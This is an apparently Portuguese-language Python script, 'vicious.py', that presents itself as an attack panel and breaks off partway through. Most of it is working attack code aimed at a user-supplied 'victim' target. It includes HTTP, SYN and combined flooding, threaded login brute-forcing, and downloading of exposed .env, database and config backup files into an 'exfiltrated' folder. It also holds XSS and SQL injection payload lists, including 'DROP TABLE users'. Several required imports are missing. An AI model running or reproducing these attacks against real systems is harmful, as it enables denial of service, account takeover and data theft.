# vicious.py
# Desenvolvido por: Vicious and Xedss

# Biblioteca padrão do Python
import os
import sys
import time
import threading
import socket
import random
import string
import hashlib
import base64
import re

# Requisições web
import requests

# Manipulação de pacotes e redes
import scapy.all as scapy

# Web scraping
from bs4 import BeautifulSoup

# Colorir o terminal
from colorama import Fore, Style, init

# Outras ferramentas úteis
import ssl
import json
import urllib.parse

# DNS e SSL
import dns.resolver
import OpenSSL

init(autoreset=True)

# Função para exibir a intro
def intro():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(Fore.RED + '''
[+] Iniciando Vicious 2.0...
[+] Carregando módulos...
[+] Pronto para dominar.

[!] Aviso: Esta ferramenta é apenas para fins de teste autorizados!
[!] O uso indevido pode ser ilegal. Você é o único responsável.
''')
    time.sleep(3)
    

# ---------------- ASCII ART -------------------
def ascii_art():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(Fore.RED + Style.BRIGHT + r"""
██╗   ██╗██╗ ██████╗██╗ ██████╗ ██╗   ██╗███████╗    ██████╗  █████╗ ██╗███╗   ██╗███████╗██╗     
██║   ██║██║██╔════╝██║██╔═══██╗██║   ██║██╔════╝    ██╔══██╗██╔══██╗██║████╗  ██║██╔════╝██║     
██║   ██║██║██║     ██║██║   ██║██║   ██║███████╗    ██████╔╝███████║██║██╔██╗ ██║█████╗  ██║     
╚██╗ ██╔╝██║██║     ██║██║   ██║██║   ██║╚════██║    ██╔═══╝ ██╔══██║██║██║╚██╗██║██╔══╝  ██║     
 ╚████╔╝ ██║╚██████╗██║╚██████╔╝╚██████╔╝███████║    ██║     ██║  ██║██║██║ ╚████║███████╗███████╗
  ╚═══╝  ╚═╝ ╚═════╝╚═╝ ╚═════╝  ╚═════╝ ╚══════╝    ╚═╝     ╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝╚══════╝╚══════╝


""")
    print(Fore.RED + Style.BRIGHT + "="*60)
    print(Fore.WHITE + Style.BRIGHT + " " * 15 + "PAINEL DE OPERAÇÕES - VICIOUS")
    print(Fore.RED + Style.BRIGHT + "="*60)
    print()

# --------------- MENU PRINCIPAL ----------------
def menu():
    ascii_art()
    print(Fore.LIGHTRED_EX + "[1] IP Lookup")
    print(Fore.LIGHTRED_EX + "[2] Scanner de Portas")
    print(Fore.LIGHTRED_EX + "[3] HTTP Flood")
    print(Fore.LIGHTRED_EX + "[4] TCP SYN Flood")
    print(Fore.LIGHTRED_EX + "[5] Modo Insano (HTTP + SYN + Portscan)")
    print(Fore.LIGHTRED_EX + "[6] Brute Force")
    print(Fore.LIGHTRED_EX + "[7] Scanner DNS")
    print(Fore.LIGHTRED_EX + "[8] Web Crawler")
    print(Fore.LIGHTRED_EX + "[9] Reconhecimento de Subdomínios")
    print(Fore.LIGHTRED_EX + "[10] Scanner de Vulnerabilidades")
    print(Fore.LIGHTRED_EX + "[11] Exfiltração de Dados")
    print(Fore.LIGHTRED_EX + "[12] Decodificador Base64")
    print(Fore.LIGHTRED_EX + "[13] Decodificador MD5")
    print(Fore.LIGHTRED_EX + "[14] Reconhecimento de Web Shell")
    print(Fore.LIGHTRED_EX + "[15] Scanner de SSL")
    print(Fore.LIGHTRED_EX + "[16] Sniffer de Pacotes")
    print(Fore.LIGHTRED_EX + "[17] Ataque XSS")
    print(Fore.LIGHTRED_EX + "[18] Injeção SQL")
    print(Fore.LIGHTRED_EX + "[19] Teste de Força Bruta em HTTP")
    print(Fore.LIGHTRED_EX + "[20] Enviar payload reverso")
    print(Fore.LIGHTRED_EX + "[21] Scanner de Vulnerabilidades de Redes")
    print(Fore.LIGHTRED_EX + "[22] Ataque de DDoS")
    print(Fore.LIGHTRED_EX + "[23] Flood UDP")
    print(Fore.LIGHTRED_EX + "[24] Payload para Exploit")
    print(Fore.LIGHTRED_EX + "[25] Backup de Arquivos Remotos")
    print(Fore.LIGHTRED_EX + "[26] Bot Raid")
    print(Fore.LIGHTRED_EX + "[0] Sair")
    print()

# ------------- OPÇÃO DE SAÍDA ----------------
def sair():
    print(Fore.YELLOW + "\nEncerrando o Painel Vicious... Até logo!")
    time.sleep(2)
    sys.exit()

# ------------------- IP Lookup --------------------
def ip_lookup():
    try:
        ascii_art()
        ip = input(Fore.WHITE + Style.BRIGHT + "\nDigite o IP para buscar informações: " + Fore.LIGHTRED_EX)
        print(Fore.YELLOW + "\nConsultando informações... Aguarde...\n")
        time.sleep(2)

        url = f"https://www.showmyip.com/ip-lookup/?ip={ip}"
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
        }

        response = requests.get(url, headers=headers, timeout=10)
        response.raise_for_status()

        if "IP Address" in response.text:
            # Método simples de extração de alguns dados relevantes
            from bs4 import BeautifulSoup
            soup = BeautifulSoup(response.text, 'html.parser')
            table = soup.find('table')
            rows = table.find_all('tr') if table else []

            info = {}
            for row in rows:
                cols = row.find_all('td')
                if len(cols) >= 2:
                    key = cols[0].text.strip()
                    value = cols[1].text.strip()
                    info[key] = value

            if info:
                print(Fore.GREEN + "\nInformações encontradas:")
                for k, v in info.items():
                    print(Fore.LIGHTWHITE_EX + f"{k}: " + Fore.LIGHTRED_EX + f"{v}")
            else:
                print(Fore.RED + "Nenhuma informação detalhada encontrada.")

        else:
            print(Fore.RED + "Não foi possível buscar as informações do IP.")

    except requests.RequestException as e:
        print(Fore.RED + f"Erro de conexão: {e}")
    except Exception as ex:
        print(Fore.RED + f"Erro inesperado: {ex}")

    input(Fore.YELLOW + "\nPressione ENTER para voltar ao menu...")
    menu()

# ------------------- Scanner de Portas --------------------
def port_scanner():
    try:
        ascii_art()
        target = input(Fore.WHITE + Style.BRIGHT + "\nDigite o IP ou domínio para escanear: " + Fore.LIGHTRED_EX)
        port_range = input(Fore.WHITE + Style.BRIGHT + "\nDigite o intervalo de portas (ex: 20-100): " + Fore.LIGHTRED_EX)

        start_port, end_port = map(int, port_range.split('-'))
        print(Fore.YELLOW + f"\nEscaneando portas de {start_port} até {end_port} em {target}...\n")
        time.sleep(1)

        open_ports = []
        for port in range(start_port, end_port + 1):
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            socket.setdefaulttimeout(0.5)
            result = sock.connect_ex((target, port))
            if result == 0:
                open_ports.append(port)
                print(Fore.GREEN + f"Porta {port} aberta")
            sock.close()

        if open_ports:
            print(Fore.LIGHTGREEN_EX + "\nPortas abertas encontradas:")
            for p in open_ports:
                print(Fore.LIGHTRED_EX + f"• Porta {p}")
        else:
            print(Fore.RED + "Nenhuma porta aberta encontrada nesse intervalo.")

    except ValueError:
        print(Fore.RED + "Formato inválido do intervalo de portas. Use algo como 20-100.")
    except socket.gaierror:
        print(Fore.RED + "Hostname inválido.")
    except Exception as e:
        print(Fore.RED + f"Erro inesperado: {e}")

    input(Fore.YELLOW + "\nPressione ENTER para voltar ao menu...")
    menu()

# ---------------------- HTTP Flood ------------------------
def http_flood():
    ascii_art()
    print(Fore.LIGHTRED_EX + "\n⚡ HTTP Flood - Somente para Testes no Seu Servidor ⚡\n")

    target_url = input(Fore.WHITE + "Digite a URL alvo (com http:// ou https://): " + Fore.LIGHTRED_EX)
    num_threads = int(input(Fore.WHITE + "Número de threads (ex: 500): " + Fore.LIGHTRED_EX))
    duration = int(input(Fore.WHITE + "Duração do ataque (segundos): " + Fore.LIGHTRED_EX))

    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        "Mozilla/5.0 (X11; Linux x86_64)",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)",
        "Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X)"
    ]

    def attack():
        timeout = time.time() + duration
        while time.time() < timeout:
            try:
                session = requests.Session()
                session.headers.update({
                    "User-Agent": random.choice(user_agents),
                    "Accept": "*/*",
                    "Connection": "keep-alive",
                    "Referer": target_url
                })
                response = session.get(target_url, timeout=2)
                print(Fore.LIGHTGREEN_EX + f"[✓] Request enviada! Status {response.status_code}")
            except Exception as e:
                print(Fore.LIGHTRED_EX + f"[✗] Erro: {str(e)}")

    threads = []

    print(Fore.YELLOW + f"\nIniciando ataque HTTP Flood por {duration} segundos usando {num_threads} threads...")
    time.sleep(2)

    for _ in range(num_threads):
        t = threading.Thread(target=attack)
        t.daemon = True
        threads.append(t)
        t.start()

    for t in threads:
        t.join()

    print(Fore.GREEN + "\n🔥 Ataque HTTP Flood finalizado.")
    input(Fore.YELLOW + "\nPressione ENTER para voltar ao menu...")
    menu()

# ---------------------- TCP SYN Flood ------------------------
def tcp_syn_flood():
    ascii_art()
    print(Fore.LIGHTRED_EX + "\n⚡ TCP SYN Flood - Para Testes Avançados em seu Servidor ⚡\n")

    target_ip = input(Fore.WHITE + "Digite o IP da vítima: " + Fore.LIGHTRED_EX)
    target_port = int(input(Fore.WHITE + "Digite a porta (ex: 80): " + Fore.LIGHTRED_EX))
    num_packets = int(input(Fore.WHITE + "Número de pacotes (ex: 50000): " + Fore.LIGHTRED_EX))
    delay = float(input(Fore.WHITE + "Delay entre pacotes (em segundos, 0 para máximo): " + Fore.LIGHTRED_EX))

    try:
        from scapy.all import IP, TCP, send
    except ImportError:
        print(Fore.RED + "\n[!] Scapy não instalado. Instalando automaticamente...")
        os.system('pip install scapy')
        from scapy.all import IP, TCP, send

    def send_syn():
        ip = IP(dst=target_ip)
        tcp = TCP(dport=target_port, flags="S")
        packet = ip/tcp
        send(packet, verbose=False)

    print(Fore.YELLOW + f"\nIniciando TCP SYN Flood em {target_ip}:{target_port}...")
    time.sleep(2)

    for i in range(num_packets):
        send_syn()
        if delay > 0:
            time.sleep(delay)
        if i % 1000 == 0:
            print(Fore.LIGHTGREEN_EX + f"Enviados {i} pacotes...")

    print(Fore.GREEN + "\n🔥 TCP SYN Flood finalizado.")
    input(Fore.YELLOW + "\nPressione ENTER para voltar ao menu...")
    menu()

# ---------------------- Modo Insano ------------------------
def insane_mode():
    ascii_art()
    print(Fore.LIGHTRED_EX + "\n💥 MODO INSANO - TESTE AVANÇADO 💥\n")

    target_ip = input(Fore.WHITE + "Digite o IP da vítima: " + Fore.LIGHTRED_EX)
    target_port = int(input(Fore.WHITE + "Digite a porta (ex: 80): " + Fore.LIGHTRED_EX))
    num_packets = int(input(Fore.WHITE + "Número de pacotes por ataque (ex: 5000): " + Fore.LIGHTRED_EX))
    delay = float(input(Fore.WHITE + "Delay entre pacotes (em segundos, 0 para máximo): " + Fore.LIGHTRED_EX))
    thread_count = int(input(Fore.WHITE + "Quantas threads (ex: 50): " + Fore.LIGHTRED_EX))

    try:
        from scapy.all import IP, TCP, send
    except ImportError:
        print(Fore.RED + "\n[!] Scapy não instalado. Instalando automaticamente...")
        os.system('pip install scapy')
        from scapy.all import IP, TCP, send

    def http_flood():
        while True:
            try:
                headers = {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
                    "Referer": f"http://{target_ip}"
                }
                requests.get(f"http://{target_ip}", headers=headers, timeout=2)
                print(Fore.LIGHTMAGENTA_EX + "[HTTP] Pacote enviado com sucesso!")
            except:
                pass

    def syn_flood():
        while True:
            ip = IP(dst=target_ip)
            tcp = TCP(dport=target_port, flags="S")
            packet = ip/tcp
            send(packet, verbose=False)
            print(Fore.LIGHTCYAN_EX + "[SYN] Pacote enviado com sucesso!")

    def port_scanner():
        ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 3306, 3389]
        for port in ports:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                result = sock.connect_ex((target_ip, port))
                if result == 0:
                    print(Fore.LIGHTGREEN_EX + f"[PORTSCAN] Porta {port} ABERTA!")
                else:
                    print(Fore.LIGHTYELLOW_EX + f"[PORTSCAN] Porta {port} FECHADA.")
                sock.close()
            except:
                pass

    print(Fore.YELLOW + f"\n🔥 Iniciando o Modo Insano em {target_ip}:{target_port} 🔥\n")
    time.sleep(2)

    for _ in range(thread_count):
        threading.Thread(target=http_flood).start()
        threading.Thread(target=syn_flood).start()
        threading.Thread(target=port_scanner).start()

    input(Fore.YELLOW + "\nPressione ENTER para voltar ao menu...")
    menu()

# ---------------------- Brute Force HTTP Login ------------------------
def brute_force_login():
    ascii_art()
    print(Fore.LIGHTRED_EX + "\n💥 BRUTE FORCE LOGIN HTTP 💥\n")

    target_url = input(Fore.WHITE + "Digite a URL da página de login: " + Fore.LIGHTRED_EX)
    username = input(Fore.WHITE + "Digite o nome de usuário para atacar: " + Fore.LIGHTRED_EX)
    user_field = input(Fore.WHITE + "Campo do formulário para usuário (ex: username, user, email): " + Fore.LIGHTRED_EX)
    pass_field = input(Fore.WHITE + "Campo do formulário para senha (ex: password, pass): " + Fore.LIGHTRED_EX)
    wordlist_path = input(Fore.WHITE + "Caminho para a wordlist (.txt): " + Fore.LIGHTRED_EX)
    threads_number = int(input(Fore.WHITE + "Quantas threads simultâneas? (ex: 10): " + Fore.LIGHTRED_EX))

    try:
        passwords = open(wordlist_path, 'r').read().splitlines()
    except FileNotFoundError:
        print(Fore.RED + "\n[!] Wordlist não encontrada. Verifique o caminho!")
        time.sleep(2)
        menu()

    found = threading.Event()

    def try_login(password):
        if found.is_set():
            return
        try:
            payload = {user_field: username, pass_field: password}
            response = requests.post(target_url, data=payload, timeout=5)
            if "Invalid" not in response.text and "incorrect" not in response.text:
                print(Fore.LIGHTGREEN_EX + f"[+] Senha encontrada: {password}")
                found.set()
            else:
                print(Fore.LIGHTYELLOW_EX + f"[-] Tentativa: {password} (falhou)")
        except Exception as e:
            print(Fore.LIGHTRED_EX + f"[!] Erro: {e}")

    print(Fore.LIGHTMAGENTA_EX + "\nIniciando força bruta...\n")
    time.sleep(1)

    with concurrent.futures.ThreadPoolExecutor(max_workers=threads_number) as executor:
        executor.map(try_login, passwords)

    if not found.is_set():
        print(Fore.LIGHTRED_EX + "\n[-] Nenhuma senha válida encontrada na wordlist.")
    input(Fore.YELLOW + "\nPressione ENTER para voltar ao menu...")
    menu()

# ---------------------- Scanner de DNS ------------------------
def dns_scanner():
    ascii_art()
    print(Fore.LIGHTRED_EX + "\n🔎 SCANNER DE SUBDOMÍNIOS DNS 🔎\n")

    target_domain = input(Fore.WHITE + "Digite o domínio alvo (ex: exemplo.com): " + Fore.LIGHTRED_EX)
    wordlist_path = input(Fore.WHITE + "Caminho da wordlist de subdomínios (.txt): " + Fore.LIGHTRED_EX)
    threads_number = int(input(Fore.WHITE + "Quantas threads simultâneas? (ex: 20): " + Fore.LIGHTRED_EX))

    try:
        subdomains = open(wordlist_path, 'r').read().splitlines()
    except FileNotFoundError:
        print(Fore.RED + "\n[!] Wordlist não encontrada. Verifique o caminho!")
        time.sleep(2)
        menu()

    found = []

    def scan_subdomain(sub):
        full_domain = f"{sub.strip()}.{target_domain}"
        try:
            socket.gethostbyname(full_domain)
            print(Fore.LIGHTGREEN_EX + f"[+] Subdomínio encontrado: {full_domain}")
            found.append(full_domain)
        except socket.gaierror:
            pass

    print(Fore.LIGHTMAGENTA_EX + "\nIniciando Scanner DNS...\n")
    time.sleep(1)

    with concurrent.futures.ThreadPoolExecutor(max_workers=threads_number) as executor:
        executor.map(scan_subdomain, subdomains)

    if found:
        print(Fore.LIGHTCYAN_EX + "\nSubdomínios ativos encontrados:")
        for sub in found:
            print(Fore.LIGHTGREEN_EX + " - " + sub)
    else:
        print(Fore.LIGHTRED_EX + "\nNenhum subdomínio encontrado.")

    input(Fore.YELLOW + "\nPressione ENTER para voltar ao menu...")
    menu()

# ---------------------- Web Crawler ------------------------
def web_crawler():
    ascii_art()
    print(Fore.LIGHTRED_EX + "\n🕷️ WEB CRAWLER 🕷️\n")

    start_url = input(Fore.WHITE + "Digite a URL para iniciar o rastreamento (ex: https://exemplo.com): " + Fore.LIGHTRED_EX)
    max_depth = int(input(Fore.WHITE + "Profundidade máxima de rastreamento (ex: 2): " + Fore.LIGHTRED_EX))

    visited = set()
    to_visit = [(start_url, 0)]

    parsed_start_url = urlparse(start_url)
    domain = parsed_start_url.netloc

    print(Fore.LIGHTMAGENTA_EX + "\nIniciando o rastreamento...\n")
    time.sleep(1)

    while to_visit:
        url, depth = to_visit.pop(0)
        if url in visited or depth > max_depth:
            continue

        visited.add(url)
        try:
            response = requests.get(url, timeout=5)
            if "text/html" not in response.headers.get("Content-Type", ""):
                continue

            soup = BeautifulSoup(response.text, "html.parser")

            for link_tag in soup.find_all("a", href=True):
                link = link_tag['href']
                link = urljoin(url, link)

                parsed_link = urlparse(link)
                if parsed_link.netloc == domain and link not in visited:
                    print(Fore.LIGHTGREEN_EX + f"[+] Link encontrado: {link}")
                    to_visit.append((link, depth + 1))

        except requests.RequestException:
            continue

    print(Fore.LIGHTCYAN_EX + f"\nRastreamento completo. {len(visited)} páginas visitadas.")

    input(Fore.YELLOW + "\nPressione ENTER para voltar ao menu...")
    menu()

# ---------------------- Subdomain Scanner ------------------------
def subdomain_scanner():
    ascii_art()
    print(Fore.LIGHTRED_EX + "\n🌐 SCANNER DE SUBDOMÍNIOS 🌐\n")

    target = input(Fore.WHITE + "Digite o domínio alvo (ex: exemplo.com): " + Fore.LIGHTRED_EX)
    threads = int(input(Fore.WHITE + "Quantas threads deseja usar? (ex: 50): " + Fore.LIGHTRED_EX))

    # Wordlist básica - Pode ser trocada por uma maior depois
    wordlist = [
        "www", "mail", "ftp", "api", "dev", "test", "admin", "portal", "app", "blog", "cpanel",
        "webmail", "vpn", "server", "ns1", "ns2", "store", "support", "docs", "forum", "beta"
    ]

    found_subdomains = []

    print(Fore.LIGHTMAGENTA_EX + "\nIniciando reconhecimento de subdomínios...\n")
    time.sleep(1)

    def scan_subdomain(subdomain):
        try:
            url = f"http://{subdomain}.{target}"
            requests.get(url, timeout=3)
            print(Fore.LIGHTGREEN_EX + f"[+] Subdomínio encontrado: {subdomain}.{target}")
            found_subdomains.append(f"{subdomain}.{target}")
        except requests.RequestException:
            pass

    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
        executor.map(scan_subdomain, wordlist)

    if found_subdomains:
        print(Fore.LIGHTCYAN_EX + f"\n{len(found_subdomains)} subdomínios encontrados.")
    else:
        print(Fore.LIGHTRED_EX + "\nNenhum subdomínio encontrado.")

    input(Fore.YELLOW + "\nPressione ENTER para voltar ao menu...")
    menu()

# ---------------------- Vulnerability Scanner ------------------------
def vulnerability_scanner():
    ascii_art()
    print(Fore.LIGHTRED_EX + "\n🚨 SCANNER DE VULNERABILIDADES 🚨\n")

    target = input(Fore.WHITE + "Digite a URL alvo (ex: http://example.com): " + Fore.LIGHTRED_EX)
    threads = int(input(Fore.WHITE + "Quantas threads deseja usar? (ex: 20): " + Fore.LIGHTRED_EX))

    # Lista de testes simples
    payloads = [
        "'", "\"", "<script>alert(1)</script>", "' OR '1'='1", "../../etc/passwd", "?id=1'", "?page=admin", "/admin", "/backup", "/test", "/dev"
    ]

    vulnerabilities = []

    print(Fore.LIGHTMAGENTA_EX + "\nIniciando o escaneamento...\n")
    time.sleep(1)

    def scan_vuln(payload):
        try:
            if payload.startswith("/"):
                url = target.rstrip("/") + payload
            else:
                url = target + payload

            response = requests.get(url, timeout=5)

            if ("syntax" in response.text.lower() or "mysql" in response.text.lower()):
                print(Fore.LIGHTGREEN_EX + f"[+] SQL Injection Possível: {url}")
                vulnerabilities.append(("SQL Injection", url))

            if "<script>alert(1)</script>" in response.text:
                print(Fore.LIGHTGREEN_EX + f"[+] XSS Vulnerabilidade: {url}")
                vulnerabilities.append(("XSS", url))

            if response.status_code == 200 and payload.startswith("/"):
                print(Fore.LIGHTGREEN_EX + f"[+] Diretório Aberto: {url}")
                vulnerabilities.append(("Diretório Aberto", url))

        except requests.exceptions.RequestException:
            pass

    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
        executor.map(scan_vuln, payloads)

    if vulnerabilities:
        print(Fore.LIGHTCYAN_EX + f"\n{len(vulnerabilities)} possíveis vulnerabilidades encontradas.")
    else:
        print(Fore.LIGHTRED_EX + "\nNenhuma vulnerabilidade óbvia encontrada.")

    input(Fore.YELLOW + "\nPressione ENTER para voltar ao menu...")
    menu()

# ---------------------- Exfiltração de Dados ------------------------
def data_exfiltration():
    ascii_art()
    print(Fore.LIGHTRED_EX + "\n📦 EXFILTRAÇÃO DE DADOS 📦\n")

    target = input(Fore.WHITE + "Digite a URL alvo (ex: http://example.com/): " + Fore.LIGHTRED_EX)
    threads = int(input(Fore.WHITE + "Quantas threads deseja usar? (ex: 10): " + Fore.LIGHTRED_EX))

    paths = [
        ".env", "backup.zip", "db.sql", "config.php.bak", "admin.bak",
        "database.sql", "config.old", "wp-config.php~", "backup.tar.gz"
    ]

    found_files = []

    if not os.path.exists("exfiltrated"):
        os.makedirs("exfiltrated")

    print(Fore.LIGHTMAGENTA_EX + "\nProcurando arquivos sensíveis...\n")
    time.sleep(1)

    def download_file(path):
        try:
            url = target.rstrip("/") + "/" + path
            response = requests.get(url, timeout=5)

            if response.status_code == 200:
                filepath = os.path.join("exfiltrated", path.replace("/", "_"))
                with open(filepath, "wb") as f:
                    f.write(response.content)
                print(Fore.LIGHTGREEN_EX + f"[+] Arquivo encontrado e baixado: {url}")
                found_files.append(url)
            else:
                print(Fore.LIGHTRED_EX + f"[-] Não encontrado: {url}")

        except requests.exceptions.RequestException:
            print(Fore.YELLOW + f"[!] Timeout/Erro no download: {url}")

    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
        executor.map(download_file, paths)

    print(Fore.CYAN + f"\n🔔 {len(found_files)} arquivos exfiltrados.")

    input(Fore.YELLOW + "\nPressione ENTER para voltar ao menu...")
    menu()

# ---------------------- Decodificador Base64 ------------------------
def base64_decoder():
    ascii_art()
    print(Fore.LIGHTRED_EX + "\n🔎 DECODIFICADOR BASE64 🔎\n")

    encoded_text = input(Fore.WHITE + "Digite o texto Base64 para decodificar: " + Fore.LIGHTRED_EX)

    try:
        decoded_bytes = base64.b64decode(encoded_text)
        decoded_text = decoded_bytes.decode('utf-8', errors='replace')
        print(Fore.LIGHTGREEN_EX + "\n🔓 Resultado Decodificado:\n")
        print(Fore.CYAN + decoded_text)

    except (base64.binascii.Error, UnicodeDecodeError) as e:
        print(Fore.LIGHTRED_EX + f"\n❌ Erro na decodificação: {e}")

    input(Fore.YELLOW + "\nPressione ENTER para voltar ao menu...")
    menu()

# ---------------------- Decodificador MD5 ------------------------
def md5_decoder():
    ascii_art()
    print(Fore.LIGHTRED_EX + "\n🔎 DECODIFICADOR MD5 🔎\n")

    md5_hash = input(Fore.WHITE + "Digite o hash MD5 para tentar decodificar: " + Fore.LIGHTRED_EX)

    # Pequeno dicionário de exemplo (em um painel completo real seria bem maior ou poderia usar APIs)
    common_passwords = [
        "123456", "password", "12345678", "qwerty", "abc123", "football", "monkey", "letmein",
        "dragon", "baseball", "sunshine", "iloveyou", "trustno1", "123123", "admin"
    ]

    found = False
    for password in common_passwords:
        if hashlib.md5(password.encode()).hexdigest() == md5_hash:
            print(Fore.LIGHTGREEN_EX + "\n🔓 Hash decodificado com sucesso!\n")
            print(Fore.CYAN + f"Senha correspondente: {password}")
            found = True
            break

    if not found:
        print(Fore.LIGHTRED_EX + "\n❌ Não foi possível decodificar o hash com o dicionário atual.")

    input(Fore.YELLOW + "\nPressione ENTER para voltar ao menu...")
    menu()

# ---------------------- Reconhecimento de Web Shell ------------------------
def web_shell_detection():
    ascii_art()
    print(Fore.LIGHTRED_EX + "\n🕵️‍♂️ RECONHECIMENTO DE WEB SHELL 🕵️‍♂️\n")

    target_url = input(Fore.WHITE + "Digite a URL do site para análise: " + Fore.LIGHTRED_EX)

    common_shells = [
        "shell.php", "cmd.php", "upload.php", "up.php", "wso.php", "r57.php", "c99.php", 
        "sh.php", "backdoor.php", "adminer.php", "phpinfo.php", "lol.php", "p0wny.php"
    ]

    print(Fore.CYAN + "\n🔎 Iniciando varredura por possíveis Web Shells...\n")

    for shell in common_shells:
        try:
            url_to_check = f"{target_url.rstrip('/')}/{shell}"
            response = requests.get(url_to_check, timeout=3)

            if response.status_code == 200:
                print(Fore.LIGHTGREEN_EX + f"⚡ Web Shell encontrada: {url_to_check}")
            else:
                print(Fore.YELLOW + f"Nada encontrado em: {url_to_check}")
        except requests.exceptions.RequestException as e:
            print(Fore.LIGHTRED_EX + f"Erro ao verificar {url_to_check}: {e}")

    print(Fore.LIGHTRED_EX + "\n🔴 Varredura concluída.")
    input(Fore.YELLOW + "\nPressione ENTER para voltar ao menu...")
    menu()

# ---------------------- Scanner de SSL ------------------------
import ssl

def ssl_scanner():
    ascii_art()
    print(Fore.LIGHTRED_EX + "\n🔒 SCANNER DE SSL 🔒\n")

    target_host = input(Fore.WHITE + "Digite o domínio (ex: exemplo.com): " + Fore.LIGHTRED_EX)

    try:
        context = ssl.create_default_context()
        with socket.create_connection((target_host, 443)) as sock:
            with context.wrap_socket(sock, server_hostname=target_host) as ssock:
                cert = ssock.getpeercert()

                print(Fore.LIGHTGREEN_EX + "\n🔍 Informações do Certificado SSL:\n")

                print(Fore.CYAN + "Emitido para: " + Fore.WHITE + str(cert.get('subject')))
                print(Fore.CYAN + "Emitido por: " + Fore.WHITE + str(cert.get('issuer')))
                print(Fore.CYAN + "Válido de: " + Fore.WHITE + str(cert.get('notBefore')))
                print(Fore.CYAN + "Válido até: " + Fore.WHITE + str(cert.get('notAfter')))
                print(Fore.CYAN + "Número Serial: " + Fore.WHITE + str(cert.get('serialNumber')))

    except Exception as e:
        print(Fore.LIGHTRED_EX + f"\n❌ Falha ao analisar o SSL: {e}")

    print(Fore.LIGHTRED_EX + "\n🔴 Análise SSL concluída.")
    input(Fore.YELLOW + "\nPressione ENTER para voltar ao menu...")
    menu()

# ---------------------- Sniffer de Pacotes ------------------------
from scapy.all import sniff

def packet_sniffer():
    ascii_art()
    print(Fore.LIGHTRED_EX + "\n📡 SNIFFER DE PACOTES 📡\n")

    interface = input(Fore.WHITE + "Digite o nome da interface de rede (ex: eth0, wlan0): " + Fore.LIGHTRED_EX)

    def process_packet(packet):
        print(Fore.LIGHTGREEN_EX + f"\n🔹 Pacote Capturado: {packet.summary()}")

    try:
        print(Fore.LIGHTRED_EX + "\n⏳ Iniciando a captura de pacotes...\n" + Fore.WHITE + "(Pressione CTRL+C para parar)\n")
        sniff(iface=interface, prn=process_packet, store=False)
    except PermissionError:
        print(Fore.LIGHTRED_EX + "\n❌ Permissão negada! Execute o script como administrador (sudo).")
    except Exception as e:
        print(Fore.LIGHTRED_EX + f"\n❌ Erro ao iniciar o sniffer: {e}")

    print(Fore.LIGHTRED_EX + "\n📡 Captura finalizada.")
    input(Fore.YELLOW + "\nPressione ENTER para voltar ao menu...")
    menu()

# ---------------------- Ataque XSS ------------------------
import urllib.parse

def xss_attack():
    ascii_art()
    print(Fore.LIGHTRED_EX + "\n💥 ATAQUE XSS (CROSS-SITE SCRIPTING) 💥\n")

    target_url = input(Fore.WHITE + "Digite a URL alvo (use '?' para parâmetros, ex: http://site.com/page.php?param=): " + Fore.LIGHTRED_EX)

    # Vetores XSS comuns para testes
    payloads = [
        "<script>alert('VICIOUS XSS')</script>",
        "\"><script>alert('XSS')</script>",
        "'><img src=x onerror=alert('XSS')>",
        "<svg/onload=alert('XSS')>",
        "<body onload=alert('XSS')>",
        "'><script>alert(document.cookie)</script>",
        "\"><svg><script>alert('XSS')</script>",
        "<iframe src='javascript:alert(\"XSS\")'>"
    ]

    print(Fore.LIGHTRED_EX + "\n🔍 Iniciando testes XSS...\n")
    try:
        for payload in payloads:
            vuln_test_url = target_url + urllib.parse.quote(payload)
            response = requests.get(vuln_test_url)

            print(Fore.LIGHTCYAN_EX + f"Tentando: {payload}")
            if payload.replace('<', '&lt;') not in response.text and payload not in response.text:
                print(Fore.YELLOW + "⚠️ Nenhuma resposta visível.")
            else:
                print(Fore.LIGHTGREEN_EX + "✅ Possível vulnerabilidade detectada!\n")
                print(Fore.GREEN + f"URL Vulnerável: {vuln_test_url}\n")

        print(Fore.LIGHTRED_EX + "💥 Testes de XSS finalizados!")
    except Exception as e:
        print(Fore.LIGHTRED_EX + f"❌ Erro durante o ataque XSS: {e}")

    input(Fore.YELLOW + "\nPressione ENTER para voltar ao menu...")
    menu()

# ---------------------- Injeção SQL ------------------------
import requests

def sql_injection():
    ascii_art()
    print(Fore.LIGHTRED_EX + "\n💥 ATAQUE INJEÇÃO SQL (SQL INJECTION) 💥\n")

    target_url = input(Fore.WHITE + "Digite a URL alvo (ex: http://site.com/vulnerable.php?id=): " + Fore.LIGHTRED_EX)

    # SQL Injection payloads para testar
    payloads = [
        "' OR 1=1 --",
        "' OR 'a'='a",
        "' OR 'x'='x' --",
        "' AND 1=1 --",
        "' UNION SELECT null, username, password FROM users --",
        "'; DROP TABLE users; --",
        "admin' --"
    ]

    print(Fore.LIGHTRED_EX + "\n🔍 Iniciando testes de Injeção SQL...\n")
    try:
        for payload in payloads:
            vuln_test_url = target_url + payload
            response = requests.get(vuln_test_url)

            print(Fore.LIGHTCYAN_EX + f"Tentando: {payload}")
            if "error" in response.text.lower() or "mysql" in response.text.lower() or "sql" in response.text.lower():
                print(Fore.LIGHTGREEN_EX + "✅ Possível vulnerabilidade detectada!\n")
                print(Fore.GREEN + f"URL Vulnerável: {vuln_test_url}\n")
            else:
                print(Fore.YELLOW + "⚠️ Nenhuma vulnerabilidade visível.")

        print(Fore.LIGHTRED_EX + "💥 Testes de Injeção SQL finalizados!")
    except Exception as e:
        print(Fore.LIGHTRED_EX + f"❌ Erro durante o ataque SQL: {e}")

    input(Fore.YELLOW + "\nPressione ENTER para voltar ao menu...")
    menu()

# ---------------------- Teste de Força Bruta em HTTP ------------------------
import requests
